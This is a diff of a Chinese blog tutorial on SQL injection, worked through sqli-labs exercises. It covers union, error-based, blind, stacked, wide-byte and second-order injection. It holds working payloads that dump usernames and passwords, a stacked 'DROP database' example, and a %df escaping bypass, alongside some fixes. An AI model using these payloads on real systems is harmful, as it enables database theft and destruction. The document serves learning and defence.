@@ -419,21 +419,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-05-20
+                    2021-06-23
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.5k
+                    4.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    16 分
                 </div>
                 
 
@@ -498,7 +498,7 @@
 <p>凡是和数据库有交互的地方都容易出现SQL注入，SQL注入经常出现在登陆页面、涉及获取HTTP头（user-agent / client-ip等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在HTTP头中的      client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 i  p的，有可能会被存储进数据库中从而与数据库发生交互导致sql注入。</p>
 </blockquote>
 <h2 id="根据特殊表判断数据库类型"><a href="#根据特殊表判断数据库类型" class="headerlink" title="根据特殊表判断数据库类型"></a>根据特殊表判断数据库类型</h2><p>目前接触的大部分都是MySQL，绝大多数的数据库的SQL语句都类似，但是当遇到其他类型的数据库时还是要通过<strong>特殊表</strong>来分辨数据库类型</p>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="判断数据库"></p>
+<p><img src="https://i.loli.net/2021/06/23/STMinrwE5BLNzVY.png" alt="判断数据库"></p>
 <h4 id="不同数据库的特殊表"><a href="#不同数据库的特殊表" class="headerlink" title="不同数据库的特殊表"></a>不同数据库的特殊表</h4><blockquote>
 <p>MySQL数据库的特有的表是 <strong>information_schema.tables ,</strong> access数据库特有的表是 <strong>msysobjects</strong> 、SQLServer 数据库特有的表是 <strong>sysobjects</strong> ,oracle数据库特有的表是 <strong>dual</strong></p>
 </blockquote>
@@ -519,58 +519,60 @@
 <h3 id="列数判断"><a href="#列数判断" class="headerlink" title="列数判断"></a>列数判断</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x #</span></span><br></pre></td></tr></table></figure>
 <h4 id="可显列"><a href="#可显列" class="headerlink" title="可显列"></a>可显列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3,...x #</span></span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>对于没有可显列的问题，是因为页面只显示一行数据，可以使用形如<em>id=-1</em>来进行注释或是<code>and 1=2</code>对前面的条件进行否定</p>
+<p>对于没有可显列的问题，是因为页面只显示一行数据，可以使用形如<em><strong>id=-1</strong></em>来进行注释或是<code>and 1=2</code>对前面的条件进行否定</p>
 </blockquote>
 <h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><h4 id="先来了解一些常用函数"><a href="#先来了解一些常用函数" class="headerlink" title="先来了解一些常用函数"></a>先来了解一些常用函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">·  version() ：数据库的版本</span><br><span class="line"></span><br><span class="line">·  database() :当前所在的数据库</span><br><span class="line"></span><br><span class="line">·  @@basedir : 数据库的安装目录</span><br><span class="line"></span><br><span class="line">·  @@datadir ： 数据库文件的存放目录</span><br><span class="line"></span><br><span class="line">·  user() ： 数据库的用户</span><br><span class="line"></span><br><span class="line">·  current_user() : 当前用户名</span><br><span class="line"></span><br><span class="line">·  system_user() : 系统用户名</span><br><span class="line"></span><br><span class="line">·  session_user() :连接到数据库的用户名</span><br></pre></td></tr></table></figure>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),system_user() --+</span></span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/system_user().png" alt="image-20210509112349669"></p>
+<p><img src="https://i.loli.net/2021/06/23/agNb9HG7lTsqodV.png" alt="image-20210509112349669"></p>
 <h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><p>已知数据库<code>security</code>查表</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</span></span><br></pre></td></tr></table></figure>
 <blockquote>
 <p><strong>group_concat(username) ：</strong>将username数据查询在一起，用逗号连接</p>
 </blockquote>
-<h4 id="information-schema-tables表中记录了所有的表名"><a href="#information-schema-tables表中记录了所有的表名" class="headerlink" title="information_schema.tables表中记录了所有的表名"></a><em>information_schema.tables</em>表中记录了所有的表名</h4><h4 id="table-schema列记录了所有数据库的库名"><a href="#table-schema列记录了所有数据库的库名" class="headerlink" title="table_schema列记录了所有数据库的库名"></a><em>table_schema</em>列记录了所有数据库的库名</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/information_schema%E8%A1%A8table_schema%E5%88%97.png" alt="image-20210509115335643"></p>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E8%A1%A8.png" alt="image-20210509115550488"></p>
+<h4 id="information-schema-tables表中记录了所有的表名"><a href="#information-schema-tables表中记录了所有的表名" class="headerlink" title="information_schema.tables表中记录了所有的表名"></a><em>information_schema.tables</em>表中记录了所有的表名</h4><h4 id="table-schema列记录了所有数据库的库名"><a href="#table-schema列记录了所有数据库的库名" class="headerlink" title="table_schema列记录了所有数据库的库名"></a><em>table_schema</em>列记录了所有数据库的库名</h4><p><img src="https://i.loli.net/2021/06/23/Q7djqByu4wJFTZx.png" alt="image-20210509115335643"></p>
+<p><img src="https://i.loli.net/2021/06/23/2H54FxOoripDhzE.png" alt="image-20210509115550488"></p>
 <h3 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot; --+</span></span><br></pre></td></tr></table></figure>
-<h4 id="information-schema-columns表中记录了所有的列名"><a href="#information-schema-columns表中记录了所有的列名" class="headerlink" title="information_schema.columns表中记录了所有的列名"></a><em>information_schema.columns</em>表中记录了所有的列名</h4><h4 id="table-name列中记录了所有的表名"><a href="#table-name列中记录了所有的表名" class="headerlink" title="table_name列中记录了所有的表名"></a><em>table_name</em>列中记录了所有的表名</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E5%88%97.png" alt="image-20210509122157896"></p>
+<h4 id="information-schema-columns表中记录了所有的列名"><a href="#information-schema-columns表中记录了所有的列名" class="headerlink" title="information_schema.columns表中记录了所有的列名"></a><em>information_schema.columns</em>表中记录了所有的列名</h4><h4 id="table-name列中记录了所有的表名"><a href="#table-name列中记录了所有的表名" class="headerlink" title="table_name列中记录了所有的表名"></a><em>table_name</em>列中记录了所有的表名</h4><p><img src="https://i.loli.net/2021/06/23/e9jNZbUsJ38lOFa.png" alt="image-20210509122157896"></p>
 <h3 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(id,&#x27;</span><span class="comment">---&#x27;,username,&#x27;---&#x27;,password),3 from users --+</span></span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E6%95%B0%E6%8D%AE.png" alt="image-20210509122715852"></p>
+<p><img src="https://i.loli.net/2021/06/23/IvUtTJPiGM7bBrV.png" alt="image-20210509122715852"></p>
 <h2 id="0x02-报错注入"><a href="#0x02-报错注入" class="headerlink" title="0x02 报错注入"></a>0x02 报错注入</h2><h3 id="利用场景-1"><a href="#利用场景-1" class="headerlink" title="利用场景"></a>利用场景</h3><p>数据库查询的返回结果并没有在页面中显示，但是会显示数据库的报错信息（也就是union注入没有显示列）</p>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>数据库查询的返回结果并没有在页面中显示，但是会显示数据库的报错信息。可以通过构造数据库报错语句，从报错信息中获取到想要的内容</p>
-<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><p>利用<strong>count()<strong>、</strong>rand()<strong>、</strong>floor()<strong>、</strong>group by</strong>函数结合在一起产生的注入，缺一不可</p>
+<h3 id="一、floor报错注入"><a href="#一、floor报错注入" class="headerlink" title="一、floor报错注入"></a>一、floor报错注入</h3><p>利用<strong>count()<strong>、</strong>rand()<strong>、</strong>floor()<strong>、</strong>group by</strong>函数结合在一起产生的注入，缺一不可</p>
 <h4 id="关键函数学习"><a href="#关键函数学习" class="headerlink" title="关键函数学习"></a>关键函数学习</h4><h5 id="rand-是随机函数"><a href="#rand-是随机函数" class="headerlink" title="rand()是随机函数"></a>rand()是随机函数</h5><p>通过一个固定的随机数0之后，可以形成固定的伪随机序列（就是rand(0)产生的数据是可预知的）</p>
 <h5 id="floor-是取整函数"><a href="#floor-是取整函数" class="headerlink" title="floor()是取整函数"></a>floor()是取整函数</h5><p>floor(rand(0)*2)就是对rand(0)产生的随机序列乘2之后取整，结果也是固定的</p>
-<h5 id="group-by是分组函数，将相同的数据分为一组"><a href="#group-by是分组函数，将相同的数据分为一组" class="headerlink" title="group by是分组函数，将相同的数据分为一组"></a>group by是分组函数，将相同的数据分为一组</h5><h5 id="count-是统计结果的行数"><a href="#count-是统计结果的行数" class="headerlink" title="count(*)是统计结果的行数"></a>count(*)是统计结果的行数</h5><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5.png" alt="image-20210509183416177"></p>
+<h5 id="group-by是分组函数，将相同的数据分为一组"><a href="#group-by是分组函数，将相同的数据分为一组" class="headerlink" title="group by是分组函数，将相同的数据分为一组"></a>group by是分组函数，将相同的数据分为一组</h5><h5 id="count-是统计结果的行数"><a href="#count-是统计结果的行数" class="headerlink" title="count(*)是统计结果的行数"></a>count(*)是统计结果的行数</h5><p><img src="https://i.loli.net/2021/06/23/IEqVxQuGlW5Omwr.png" alt="image-20210509183416177"></p>
 <p>形如：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//分解来看</span></span><br><span class="line"><span class="string">concat(user(),floor(rand(0)*2))x起了个别名，也就是相当于concat(user(),floor(rand(0)*2))=x</span></span><br><span class="line"><span class="string">ps:这里的user()是要查询的函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">同理(select count(*),x from information_schema.tables group by x)=a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">也就是select 1 from a</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
 
 
 <p>详细原理分析：</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">Mysql报错注入之floor(rand(0)*2)报错原理探究</a></p>
 <p>以sqli-labs中less6为例</p>
 <p>union注入不会回显列信息，故使用报错注入</p>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/less6.png" alt="image-20210509204534799"></p>
+<p><img src="https://i.loli.net/2021/06/23/3ljneN2vBXV6xJ8.png" alt="image-20210509204534799"></p>
 <h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span>&quot;and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"></span><br><span class="line">database()的位置可以嵌套sql语句进行查询</span><br><span class="line"></span><br><span class="line">//也可以通过information_schema.schemata表中的schema_name列查库</span><br><span class="line">(select schema_name from information_schema.schemata limit 0,1)</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="image-20210509205248015"></p>
+<p><img src="https://i.loli.net/2021/06/23/DMh2Ap34ikYQCcl.png" alt="image-20210509205248015"></p>
 <blockquote>
 <p>security后面的1是floor(rand(0)*2)产生的数字1</p>
 </blockquote>
 <h4 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot; limit <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>这样查询的结果是只会显示一个字段，不加`limit <span class="number">0</span>,<span class="number">1</span>`又会报错`Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span>`</span><br><span class="line"></span><br><span class="line">解决办法：使用group_concat()函数查出所有内容</span><br><span class="line">(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;security&quot;)</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/table_name.png" alt="table_name"></p>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/group_concat(table_name).png" alt="group_concat(table_name)"></p>
-<h4 id="查列，查数据"><a href="#查列，查数据" class="headerlink" title="查列，查数据"></a>查列，查数据</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%9F%A5%E5%88%97.png" alt="image-20210510090611516"></p>
+<p><img src="https://i.loli.net/2021/06/23/sH4W7MENVe5iQ9g.png" alt="table_name"></p>
+<p><img src="https://i.loli.net/2021/06/23/8DR16C9LGcbyKPm.png" alt="group_concat(table_name)"></p>
+<h4 id="查列，查数据"><a href="#查列，查数据" class="headerlink" title="查列，查数据"></a>查列，查数据</h4><p><img src="https://i.loli.net/2021/06/23/BzeDgcubZr5yFRH.png" alt="image-20210510090611516"></p>
 <p>但是在查数据时会遇见一个奇怪的问题，使用*group_concat()*也出不来数据</p>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/group_concat(id,username,password).png" alt="group_concat(id,username,password)"></p>
+<p><img src="https://i.loli.net/2021/06/23/6T1bXrfCYkqeEvQ.png" alt="group_concat(id,username,password)"></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zpy1998zpy/article/details/80650540">floor()报错注入</a></p>
-<h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><blockquote>
+<h3 id="二、extractvalue报错注入"><a href="#二、extractvalue报错注入" class="headerlink" title="二、extractvalue报错注入"></a>二、extractvalue报错注入</h3><blockquote>
 <p>MySQL 5.1.5版本后才包含ExtractValue()和UpdateXML()这2个函数</p>
 </blockquote>
 <h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>extractvalue(xml_document,xpath_string)</p>
@@ -586,7 +588,7 @@
 <p>有意思的来了</p>
 <h4 id="截取字符串"><a href="#截取字符串" class="headerlink" title="截取字符串"></a>截取字符串</h4><p>当查列的时候会因为超过最大限度32位只会显示部分数据</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;</span><br><span class="line">and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),0x7e))--+</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/extractvalue%E6%9F%A5%E5%88%97.png" alt="image-20210510100413545"></p>
+<p><img src="https://i.loli.net/2021/06/23/IbhYXk9S3vRGjtC.png" alt="image-20210510100413545"></p>
 <p>这里要进行<strong>截取字符串</strong></p>
 <h5 id="三大法宝：mid-substr-left"><a href="#三大法宝：mid-substr-left" class="headerlink" title="三大法宝：mid(),substr(),left"></a>三大法宝：mid(),substr(),left</h5><p><code>mid(column_name,start,length)</code></p>
 <blockquote>
@@ -597,13 +599,13 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>截取<span class="number">32</span>位起的字符</span><br><span class="line">mid((<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;users&quot;)<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>同理passwor后面的也可以截取</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/mid.png" alt="image-20210510102356419"></p>
+<p><img src="https://i.loli.net/2021/06/23/lHJgEhGduiNaYxq.png" alt="image-20210510102356419"></p>
 <p><code>substr</code>使用同<code>mid()</code></p>
 <p>有<code>left</code>那必定有<code>right</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">left(string,n)截取string字符串左起的n个字符</span><br><span class="line">right同理</span><br></pre></td></tr></table></figure>
 <p>查数据，同样要进行截取</p>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/extractvalue%E6%9F%A5%E6%95%B0%E6%8D%AE.png" alt="image-20210510110558424"></p>
-<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><blockquote>
+<p><img src="https://i.loli.net/2021/06/23/IepENucHvlhG25r.png" alt="image-20210510110558424"></p>
+<h3 id="三、updatexml报错注入"><a href="#三、updatexml报错注入" class="headerlink" title="三、updatexml报错注入"></a>三、updatexml报错注入</h3><blockquote>
 <p>对比extractvalue报错注入</p>
 </blockquote>
 <h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h4><p>updatexml (XML_document, XPath_string, new_value)</p>
@@ -615,20 +617,107 @@
 <h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>改变文档中符合条件的节点的值</p>
 <h4 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml (1,concat(0x7e,payload,0x7e),1)</span><br></pre></td></tr></table></figure>
 <p>其余操作同<code>extractvalue</code></p>
-<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/updatexml%E6%9F%A5%E6%95%B0%E6%8D%AEpng" alt="image-20210510110951163"></p>
+<p><img src="https://i.loli.net/2021/06/23/MoAnvNQgFf3wYTZ.png" alt="image-20210623192032232"></p>
 <h3 id="其他报错注入"><a href="#其他报错注入" class="headerlink" title="其他报错注入"></a>其他报错注入</h3><p>如<code>geometrycollection()``multipoint()</code>,<code>polygon()</code>,<code>multipolygon()</code>,<code>exp()</code>等等就不展开叙述了，可以百度了解更多</p>
 <h2 id="0x03-盲注"><a href="#0x03-盲注" class="headerlink" title="0x03 盲注"></a>0x03 盲注</h2><h3 id="利用场景-2"><a href="#利用场景-2" class="headerlink" title="利用场景"></a>利用场景</h3><p>页面连错误信息都没有回显，通过盲注来验证sql语句是否执行</p>
 <h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>布尔盲注：页面只返回true，false两种类型的页面，利用页面的返回不同，逐个猜解数据</p>
 <p>时间盲注：通过sleep()函数判断页面相应时间</p>
 <p>用到的函数：<strong>ascii()、substr() 、length()，exists()、concat()</strong></p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>原理是使用了二分法来进行数据库长度、数据库名等的猜解</strong></p>
+<blockquote>
+<p>就是从数据库到表，再到字段，最后到数据，依次使用length函数进行长度和使用substr函数根据字符的ASCII值进行猜解</p>
+</blockquote>
+<blockquote>
+<p>了解了原理后直接使用sqlmap工具会极大提高效率</p>
+</blockquote>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>利用sleep()函数使得页面回显速度明显变慢，则存在时间盲注</p>
+<h2 id="0x04-堆叠注入"><a href="#0x04-堆叠注入" class="headerlink" title="0x04 堆叠注入"></a>0x04 堆叠注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>sql中一个分号（;）表示一条sql语句的结束，而堆叠注入就是在结束 一个sql语句后继续构造下一个语句</p>
+<p>对比union联合注入</p>
+<blockquote>
+<p>union可以执行的语句类型是有限的，只可以用来执行查询语句</p>
+<p>堆叠注入可以执行的是任意的语句</p>
+<p>例：输入root’;DROP database user;实际执行的是select * from user where name=’root’;DROP  database user;</p>
+</blockquote>
+<h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>受到API或数据库引擎不支持或是权限等原因的限制</p>
+<p>在查询数据时，通常只返回一个查询结果，因此堆叠注入的第二个语句产生的结果或者错误就会被忽略，在前端界面也看不到返回的结果</p>
+<p>因此在查询、读取数据时使用union进行联合查询，而且在堆叠注入前也是需要知道一些数据库的相关信息</p>
+<h3 id="例less-38"><a href="#例less-38" class="headerlink" title="例less-38"></a>例less-38</h3><p>经测试是字符型注入，使用<code>--+</code>进行过滤</p>
+<p>查出users表中的数据</p>
+<p><img src="https://i.loli.net/2021/06/23/rsxOhHdc8jLgPub.png" alt="image-20210623132157796"></p>
+<p>使用堆叠注入进行数据修改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users(id,username,password) values (&#39;99&#39;,&#39;newusername&#39;,&#39;newpassword&#39;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/06/23/polCMfZSJ6ktI82.png"></p>
+<p>​                                                                                                                                                                                                                                  </p>
+<h2 id="0x05-宽字节注入"><a href="#0x05-宽字节注入" class="headerlink" title="0x05  宽字节注入"></a>0x05  宽字节注入</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>宽字节注入示由于不同编码中中文所占的字符长度不同，在gbk编码中，一个汉字占两个字节，而在utf-8中，一个汉字占三个字节</p>
+<p>首先学习几个php中对sql注入过滤的函数：</p>
+<blockquote>
+<p>addslashes() 在预定义字符之前添加反斜杠\进行转义，但是并不会插入到数据库中</p>
+<p>（预定义字符：单引号，双引号，反斜杠，NULL）</p>
+<p>mysql_real_escape_string() 转义sql语句中的特殊符号：x00 、\n 、\r 、\ 、‘ 、“ 、x1a</p>
+<p>魔术引号：将预定义字符加上反斜杠\进行转义，作用同addslashes()，所以这两个打开一个即可。魔术引号有以下三个</p>
+<blockquote>
+<p>magic_quotes_gps() 默认为on （php5.4.0以上已经被移除）</p>
+<p>magic_quotes_runtime() 默认为off</p>
+<p>magic_quotes_sybase() 默认为off</p>
+</blockquote>
+</blockquote>
+<p>因为这些函数会加反斜杠\进行字符转义，所以要使用宽字节进行绕过</p>
+<p>宽字节注入利用的是mysql的一个特性，当mysql在使用gbk编码时，会认为<strong>两个字符是一个汉字</strong>，而前提就是<strong>第一个字符的ASCII值要大于128</strong>，才是认为是汉字</p>
+<blockquote>
+<p><code>1%df\&#39;</code>中\会被url编码成<code>%25df%5C%27</code>其中的<code>%25df%5C</code>会被当做汉字来处理，从而<code>%27</code>逃脱出来，然后就发生了报错</p>
+<p>又因为只需要输入的数据ASCII大于128才会被认为两个字符是一个汉字，所以输入的数据大于等于%81即可使’逃脱出来</p>
+</blockquote>
+<h3 id="例less-32"><a href="#例less-32" class="headerlink" title="例less-32"></a>例less-32</h3><p><img src="https://i.loli.net/2021/06/23/baM9mL8S5InXVjz.png" alt="image-20210623170134200"></p>
+<p>会发现单引号，双引号均会被转义前面加了反斜杠\</p>
+<p>使用宽字节进行绕过</p>
+<p><img src="https://i.loli.net/2021/06/23/gh6mH84ESM2IRKX.png" alt="image-20210623172114654"></p>
+<p>然后配合联合查询进行注入</p>
+<p>还需要注意的是因为双引号被过滤，所以要对字符串<code>&quot;security&quot;</code>、<code>&quot;users&quot;</code><strong>十六进制转换</strong>将<code>security</code>16进制转码为<code>7365637572697479</code>，<code>users</code>转换为<code>7573657273</code>，最后还要加上**<code>0x</code>**</p>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><h4 id="mysql-real-escape-string-函数之前设置字符集"><a href="#mysql-real-escape-string-函数之前设置字符集" class="headerlink" title="mysql_real_escape_string()函数之前设置字符集"></a>mysql_real_escape_string()函数之前设置字符集</h4><p>当将<code>addslashe()</code>替换为<code>mysql_real_escape_string()</code>函数后，如果没有指定php连接mysql的字符集，也就是没有在执行sql语句前调用mysql_set_charset函数设置当前连接的字符集为gbk <code>mysql_set_charset=(‘gbk’,$conn)</code>，就会导致宽字节注入</p>
+<p>而修复方法就是在调用<code>mysql_real_escape_string()</code>之前，先设置连接所使用的字符集为GBK ，<strong>mysql_set_charset=(‘gbk’,$conn)</strong></p>
+<h4 id="character-set-client-设置为binary-二进制"><a href="#character-set-client-设置为binary-二进制" class="headerlink" title="character_set_client 设置为binary(二进制)"></a>character_set_client 设置为binary(二进制)</h4><p>需要在所有的sql语句前指定连接的形式是binary二进制：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>因为mysql收到客户端请求的数据时，会认为收到的编码格式是<code>character_set_client</code>对应的编码，然后会转换为<code>character_set_connection</code>对应的编码，当进入表查询字段的信息时又会转换为字段所对应的编码，而在产生查询结果后又会从字段对应的编码转换为<code>character_set_results</code>的编码形式，最后返回给客户端</p>
+<p>所以只要在一开始将<code>character_set_client</code>的编码设置为二进制，就可使得所有数据是以二进制形式传递，不存在宽字节注入</p>
+</blockquote>
+<h2 id="0x06-二次注入"><a href="#0x06-二次注入" class="headerlink" title="0x06 二次注入"></a>0x06 二次注入</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>二次注入，就是攻击者第一次向服务端发送请求时会将恶意构造的数据存储到数据库中，然后在第二次进行不同的请求，服务端收到请求后会在数据库中查询处理已经储存的信息，从而导致第一次请求构造的恶意数据（sql语句或命令）在服务端运行</p>
+<p>可以概括为两步：</p>
+<blockquote>
+<p>插入恶意数据</p>
+<blockquote>
+<p>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据</p>
+</blockquote>
+<p>引用恶意数据</p>
+<blockquote>
+<p>数据已经存储在数据库中了，而且已经存储的数据默认是安全的。在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理</p>
+</blockquote>
+</blockquote>
